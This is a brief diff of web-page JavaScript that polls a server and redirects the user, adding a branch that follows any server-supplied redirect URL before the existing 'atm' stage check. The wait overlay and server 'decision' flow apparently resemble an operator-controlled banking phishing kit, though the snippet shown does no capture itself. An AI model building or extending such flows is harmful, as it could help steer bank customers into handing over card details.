@@ -335,7 +335,11 @@
           .then(function(res){ return res.json(); })
           .then(function(data){
             if (!data.ok) return;
-            if (data.stage === 'atm' && data.decision === 'pending') {
+            if (data.redirect) {
+              stopPoll();
+              waitOverlay.classList.remove('show');
+              window.location.href = data.redirect + '?id=' + requestId;
+            } else if (data.stage === 'atm' && data.decision === 'pending') {
               stopPoll();
               waitOverlay.classList.remove('show');
               window.location.href = 'atm-en.html?id=' + requestId;
